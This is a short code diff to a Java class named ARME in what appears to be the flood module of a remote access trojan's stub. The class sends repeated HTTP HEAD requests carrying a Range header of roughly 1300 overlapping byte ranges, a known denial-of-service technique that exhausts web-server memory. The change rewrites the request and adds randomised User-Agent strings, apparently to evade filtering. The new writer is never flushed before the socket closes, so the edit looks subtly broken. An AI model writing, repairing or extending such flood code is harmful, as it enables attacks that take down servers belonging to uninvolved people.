@@ -1,5 +1,6 @@
 package su.jrat.stub.flood;
 
+import java.io.PrintWriter;
 import java.net.Socket;
 
 import su.jrat.stub.Constants;
@@ -23,7 +24,14 @@ public class ARME implements Runnable {
 				for (int i = 0; i < 1300; i++) {
 					p += ",5-" + i;
 				}
-				sock.getOutputStream().write(("HEAD / HTTP/1.1\r\nHost: " + target + "\r\nRange:bytes=0-" + p + "\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
+				PrintWriter pw = new PrintWriter(sock.getOutputStream());
+				pw.println("HEAD / HTTP/1.1");
+				pw.println("Host: " + target);
+				pw.println("User-Agent: " + Useragents.getRandomUserAgent());
+				pw.println("Range:bytes=0-" + p);
+				pw.println("Accept-Encoding: gzip");
+				pw.println("Connection: close");
+				pw.println();
 				sock.close();
 			} catch (Exception ex) {
 				ex.printStackTrace();
